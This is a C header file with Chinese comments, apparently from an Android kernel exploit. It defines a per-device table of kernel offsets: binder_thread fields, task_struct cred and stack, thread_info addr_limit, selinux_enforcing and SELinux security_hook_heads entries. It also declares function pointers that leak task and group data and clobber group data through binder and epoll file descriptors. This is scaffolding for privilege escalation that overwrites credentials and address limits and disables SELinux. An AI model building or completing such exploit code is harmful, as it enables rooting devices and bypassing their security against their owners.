#ifndef _DEVINFO_H_
#define _DEVINFO_H_

struct leak_data;
struct leak_gdata;
struct clobber_gdata;

enum{
	DEVINFO_OFFSET_NO,
	DEVINFO_OFFSET_OK,
	DEVINFO_OFFSET_SELINUX_NO,
	DEVINFO_OFFSET_SELINUX_OK,
};

struct devinfo{
	int flag;
	char* devname; 	               // 设备名称 /system/build.prog/ ro.product.model
	char* kernver;                 // 内存版本 /proc/version, uname -r
	int binder_thread_size; 	   // binder_thread 结构体大小
	int offset_binder_task; 	   // offsetof(binder_thread.task)
	int offset_binder_next; 	   // offsetof(binder_thread.wait.task_list.next)
	int offset_binder_wait; 	   // offsetof(binder_thread.wait)
	int offset_binder_next_task;   // binder_thread 结构体中next和task字段之间的偏移
	int offset_task_stack;		   // offsetof(task_struct.stack)
	int offset_task_cred;		   // offsetof(task_struct.cred)
	int offset_task_sched_class;   // offsetof(task_struct.sched_class)
	int offset_addr_limit;		   // offsetof(thread_info.addr_limit)
	int offset_selinux; 		   // 全局变量 fair_sched_class 与 selinux_enforcing 之间的偏移
	int kern_copy_offset;          // 泄漏的内核地址与拷贝地址之间的偏移
	int kern_copy_size;	           // 总共需要拷贝数据的大小
	int (*leak_task)(int binder_fd, int epfd, struct leak_data* dat);
	int (*leak_group_data)(int binder_fd, int epfd, struct leak_gdata* gdata);
	int (*clobber_group_data)(int binder_fd, int epfd, struct clobber_gdata* gdata, int count);
	int selinux_hook_capable;		   // capable链表头在security_hook_heads中偏移
	int selinux_hook_inode_permission; // inode_permission链表头在security_hook_heads中偏移
	int selinux_hook_inode_setattr;    // inode_setattr链表头在security_hook_heads中偏移
	int selinux_hook_inode_getattr;    // inode_getattr链表头在security_hook_heads中偏移
	int selinux_hook_file_permission;  // file_permission链表头在security_hook_heads中偏移
	int selinux_hook_file_open; 	   // file_open链表头在security_hook_heads中偏移
	int security_hook_heads;		   // security_hook_heads 和 全局变量 fair_sched_class 之间的偏移
};

extern struct devinfo *dev_info;

struct devinfo* get_devinfo(void);

#endif
